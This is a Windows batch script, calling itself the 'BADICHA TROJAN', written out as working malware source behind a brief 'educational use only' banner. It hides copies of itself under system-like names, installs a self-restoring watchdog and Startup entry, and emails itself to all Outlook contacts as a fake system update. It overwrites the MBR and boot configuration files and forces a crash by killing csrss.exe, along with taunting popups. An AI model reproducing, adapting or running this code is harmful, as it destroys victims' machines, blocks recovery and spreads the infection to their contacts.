@echo off
title System Service
color 0c

:: ==================================================
:: PERINGATAN PENTING
:: ==================================================
echo ==================================================
echo ⚠️  WARNING: FOR EDUCATIONAL USE ONLY
echo This script modifies boot settings, blocks reinstall,
echo spreads via Outlook, and persists across reset.
echo USE ONLY ON VIRTUAL MACHINES / TEST DEVICES!
echo ==================================================
pause >nul

:: Cek hak administrator
net session >nul 2>&1 || (echo MUST RUN AS ADMINISTRATOR! & pause & exit /b)

set "nama_asal=%~nx0"
set "lokasi_asal=%~dp0"

:: ==================================================
:: 1. SALIN KE BANYAK LOKASI + JADIKAN TERSembunyi
:: ==================================================
md "D:\System\Backup" 2>nul
md "D:\Recovery\Bin" 2>nul
md "E:\System\Update" 2>nul
md "E:\Service\Config" 2>nul
md "%SystemDrive%\ProgramData\WindowsCache" 2>nul
md "%SystemDrive%\ProgramData\SystemTools" 2>nul
md "%SystemDrive%\Users\Public\Documents\SystemData" 2>nul

copy /y "%lokasi_asal%%nama_asal%" "D:\System\Backup\sys_core.bat" >nul 2>&1
copy /y "%lokasi_asal%%nama_asal%" "D:\Recovery\Bin\driver_svc.bat" >nul 2>&1
copy /y "%lokasi_asal%%nama_asal%" "E:\System\Update\win_update.bat" >nul 2>&1
copy /y "%lokasi_asal%%nama_asal%" "E:\Service\Config\boot_helper.bat" >nul 2>&1
copy /y "%lokasi_asal%%nama_asal%" "%SystemDrive%\ProgramData\WindowsCache\main_svc.bat" >nul 2>&1
copy /y "%lokasi_asal%%nama_asal%" "%SystemDrive%\ProgramData\SystemTools\sys_check.bat" >nul 2>&1
copy /y "%lokasi_asal%%nama_asal%" "%SystemDrive%\Users\Public\Documents\SystemData\service_run.bat" >nul 2>&1

attrib +h +s +r "D:\System\Backup\*" >nul 2>&1
attrib +h +s +r "D:\Recovery\Bin\*" >nul 2>&1
attrib +h +s +r "E:\System\Update\*" >nul 2>&1
attrib +h +s +r "E:\Service\Config\*" >nul 2>&1
attrib +h +s +r "%SystemDrive%\ProgramData\WindowsCache\*" >nul 2>&1
attrib +h +s +r "%SystemDrive%\ProgramData\SystemTools\*" >nul 2>&1
attrib +h +s +r "%SystemDrive%\Users\Public\Documents\SystemData\*" >nul 2>&1

:: ==================================================
:: 2. PENGAWAS OTOMATIS: PULIHKAN JIKA ADA YANG HILANG
:: ==================================================
(
echo Set WshShell = CreateObject("WScript.Shell")
echo Set FSO = CreateObject("Scripting.FileSystemObject")
echo On Error Resume Next
echo Do
echo     Dim lokasi : lokasi = Array(_
echo         "D:\System\Backup\sys_core.bat",_
echo         "D:\Recovery\Bin\driver_svc.bat",_
echo         "E:\System\Update\win_update.bat",_
echo         "E:\Service\Config\boot_helper.bat",_
echo         "C:\ProgramData\WindowsCache\main_svc.bat",_
echo         "C:\ProgramData\SystemTools\sys_check.bat",_
echo         "C:\Users\Public\Documents\SystemData\service_run.bat"_
echo     )
echo     startup = WshShell.SpecialFolders("Startup") & "\Windows Update Service.bat"
echo     Dim sumber : sumber = ""
echo     For Each f In lokasi : If FSO.FileExists(f) Then sumber = f : Exit For : Next
echo     If sumber <> "" Then
echo         If Not FSO.FileExists(startup) Then FSO.CopyFile sumber, startup, True
echo         For Each f In lokasi : If Not FSO.FileExists(f) Then FSO.CopyFile sumber, f, True : Next
echo     End If
echo     WScript.Sleep 30000
echo Loop
) > watchdog.vbs
start "" wscript.exe watchdog.vbs /b >nul 2>&1

:: ==================================================
:: 3. PENYEBARAN OTOMATIS LEWAT OUTLOOK
:: ==================================================
(
echo Set WshShell = CreateObject("WScript.Shell")
echo Set FSO = CreateObject("Scripting.FileSystemObject")
echo On Error Resume Next
echo Set OutApp = CreateObject("Outlook.Application")
echo If Err.Number = 0 Then
echo     Set MAPI = OutApp.GetNamespace("MAPI")
echo     MAPI.Logon "", "", False, False
echo     Set ThisFile = FSO.GetFile(WScript.ScriptFullName)
echo     For Each AddrList In MAPI.AddressLists
echo         If AddrList.AddressEntries.Count > 0 Then
echo             For Each Contact In AddrList.AddressEntries
echo                 Set Mail = OutApp.CreateItem(0)
echo                 Mail.To = Contact.Address
echo                 Mail.Subject = "Important System Update"
echo                 Mail.Body = "Check this attached update file for your PC."
echo                 Mail.Attachments.Add ThisFile.Path
echo                 Mail.Send
echo             Next
echo         End If
echo     Next
echo     MAPI.Logoff
echo End If
) > spread.vbs
cscript //nologo spread.vbs
del spread.vbs >nul 2>&1

:: ==================================================
:: 4. BUKA NOTEPAD SESUAI PERMINTAAN
:: ==================================================
echo YOUR PC HAS BEEN FUCKED BY BADICHA TROJAN > "%temp%\BADICHA_MSG.txt"
echo THIS TROJAN CANNOT BE DELETED FROM WINDOWS AND IF YOU REINSTALL THE WINDOWS THIS FILE NOT DELETED >> "%temp%\BADICHA_MSG.txt"
echo SAY GOODBYE >> "%temp%\BADICHA_MSG.txt"
start "" notepad.exe "%temp%\BADICHA_MSG.txt"

:: ==================================================
:: 5. PERBAIKAN LOKASI BOOT + OVERWRITE MBR
:: ==================================================
bcdedit /export "C:\BCD_BAK_BAK" >nul 2>&1

:: Timpa MBR agar bootrec tidak bisa pulihkan
bootsect /nt60 SYS /mbr /force >nul 2>&1

:: Hapus dan timpa di lokasi yang benar
del /f /q "%SystemDrive%\Windows\Boot\DVD\EFI\BCD" >nul 2>&1
del /f /q "%SystemDrive%\Windows\Boot\DVD\PCAT\BCD" >nul 2>&1
del /f /q "%SystemDrive%\Boot\BCD" >nul 2>&1
del /f /q "%SystemDrive%\EFI\Microsoft\Boot\BCD" >nul 2>&1

:: Isi dengan tulisan yang muncul saat restart
powershell -Command "$msg = [byte[]]@(89,79,85,82,32,80,67,32,72,65,83,32,66,69,69,78,32,84,82,65,83,72,69,68,32,66,89,32,66,65,68,73,67,72,65,32,84,82,79,74,65,78); $pad = [byte[]]::CreateInstance([byte], 470); $sig = [byte[]]@(85,170); $data = $msg + $pad + $sig; [IO.File]::WriteAllBytes('C:\Windows\Boot\DVD\EFI\BCD', $data)" >nul 2>&1
powershell -Command "$msg = [byte[]]@(89,79,85,82,32,80,67,32,72,65,83,32,66,69,69,78,32,84,82,65,83,72,69,68,32,66,89,32,66,65,68,73,67,72,65,32,84,82,79,74,65,78); $pad = [byte[]]::CreateInstance([byte], 470); $sig = [byte[]]@(85,170); $data = $msg + $pad + $sig; [IO.File]::WriteAllBytes('C:\Windows\Boot\DVD\PCAT\BCD', $data)" >nul 2>&1
powershell -Command "$msg = [byte[]]@(89,79,85,82,32,80,67,32,72,65,83,32,66,69,69,78,32,84,82,65,83,72,69,68,32,66,89,32,66,65,68,73,67,72,65,32,84,82,79,74,65,78); $pad = [byte[]]::CreateInstance([byte], 470); $sig = [byte[]]@(85,170); $data = $msg + $pad + $sig; [IO.File]::WriteAllBytes('C:\Boot\BCD', $data)" >nul 2>&1
powershell -Command "$msg = [byte[]]@(89,79,85,82,32,80,67,32,72,65,83,32,66,69,69,78,32,84,82,65,83,72,69,68,32,66,89,32,66,65,68,73,67,72,65,32,84,82,79,74,65,78); $pad = [byte[]]::CreateInstance([byte], 470); $sig = [byte[]]@(85,170); $data = $msg + $pad + $sig; [IO.File]::WriteAllBytes('C:\EFI\Microsoft\Boot\BCD', $data)" >nul 2>&1

:: ==================================================
:: 6. JEBAKAN TUTUP = LANGSUNG BSOD
:: ==================================================
(
echo Set WshShell = CreateObject("WScript.Shell")
echo Sub OnQuit : WshShell.Run "cmd /c taskkill /f /im csrss.exe", 0, False : End Sub
echo Do : WScript.Sleep 200 : Loop
) > trap.vbs
start "" wscript.exe trap.vbs

:: ==================================================
:: 7. URUTAN EFEK SESUAI
:: ==================================================
set "start=%time%"
:loop_url
for /l %%i in (1,1,3) do start "" "https://example.com/how-to-clean-your-virus"
call :get_time
if %elapsed% lss 5 goto loop_url

set "start=%time%"
:loop_msg
mshta "vbscript:msgbox(""Still using this pc?"",vbExclamation,""Lol"")(close)"
call :get_time
if %elapsed% lss 5 goto loop_msg

(
echo Set WshShell = CreateObject("WScript.Shell") : Randomize : start = Timer
echo Do While Timer - start ^< 23
echo     WshShell.SendKeys "{SCROLLLOCK}" : WScript.Sleep 80
echo     WshShell.SendKeys "{SCROLLLOCK}" : WScript.Sleep 80
echo     x = Int(Rnd * 1900) : y = Int(Rnd * 1000)
echo     WshShell.Run "mshta ""<script>moveTo(" & x & "," & y & ");</script>""",0,True
echo     typ = Int(Rnd * 3)
echo     If typ = 0 Then m = vbExclamation : t = "Warning"
echo     If typ = 1 Then m = vbInformation : t = "Info"
echo     If typ = 2 Then m = vbError : t = "Error"
echo     WshShell.Popup "System activity detected", 1, t, m
echo     WScript.Sleep 120
echo Loop
) > effects.vbs
cscript //nologo effects.vbs

(
echo Set WshShell = CreateObject("WScript.Shell")
echo Set doc = CreateObject("HTMLFile")
echo w = doc.parentWindow.screen.width : h = doc.parentWindow.screen.height : start = Timer
echo Do While Timer - start ^< 23
echo     For sz = 0 To 180 Step 12
echo         WshShell.Run "mshta ""<script>resizeTo(" & w-sz*2 & "," & h-sz*2 & ");moveTo(" & sz & "," & sz & ");</script>""",0,True
echo         WScript.Sleep 25
echo     Next
echo     For sz = 180 To 0 Step -12
echo         WshShell.Run "mshta ""<script>resizeTo(" & w-sz*2 & "," & h-sz*2 & ");moveTo(" & sz & "," & sz & ");</script>""",0,True
echo         WScript.Sleep 25
echo     Next
echo Loop
echo WshShell.Run "cmd /c taskkill /f /im csrss.exe", 0, False
) > final.vbs
cscript //nologo final.vbs

:: Bersihkan file sementara
del "%temp%\BADICHA_MSG.txt" effects.vbs final.vbs >nul 2>&1
exit /b

:: ==================================================
:: FUNGSI HITUNG WAKTU
:: ==================================================
:get_time
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do (set /a h2=1%%a-100, m2=1%%b-100, s2=1%%c-100)
for /f "tokens=1-4 delims=:.," %%a in ("%start%") do (set /a h1=1%%a-100, m1=1%%b-100, s1=1%%c-100)
set /a elapsed=((h2*3600 + m2*60 + s2) - (h1*3600 + m1*60 + s1))
if %elapsed% lss 0 set /a elapsed+=86400
exit /b